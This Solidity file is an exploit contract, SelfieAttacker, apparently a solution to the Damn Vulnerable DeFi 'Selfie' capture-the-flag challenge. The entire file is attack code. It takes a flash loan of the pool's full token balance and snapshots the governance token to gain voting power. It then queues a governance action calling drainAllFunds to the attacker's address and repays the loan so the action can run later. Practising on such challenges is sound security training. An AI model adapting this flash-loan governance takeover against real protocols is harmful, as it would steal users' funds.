// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title SelfieAttacker
 * @author kootsZhin
 */
contract SelfieAttacker {

    address private _attackerAddress;
    address private _poolAddress;
    address private _govAddress;
    address private _tokenAddress;

    uint private _actionId;

    constructor(address attackerAddress, address poolAddress, address govAddress, address tokenAddress) {
        _attackerAddress = attackerAddress;
        _poolAddress = poolAddress;
        _govAddress = govAddress;
        _tokenAddress = tokenAddress;
    }

    function attack() external {
        SelfiePool(_poolAddress).flashLoan(DamnValuableTokenSnapshot(_tokenAddress).balanceOf(_poolAddress));
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(_tokenAddress).snapshot();
        _actionId = SimpleGovernance(_govAddress).queueAction(
            _poolAddress,
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                _attackerAddress
                ),
            0);
        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }

    function harvest() external {
        SimpleGovernance(_govAddress).executeAction(_actionId);
    }
}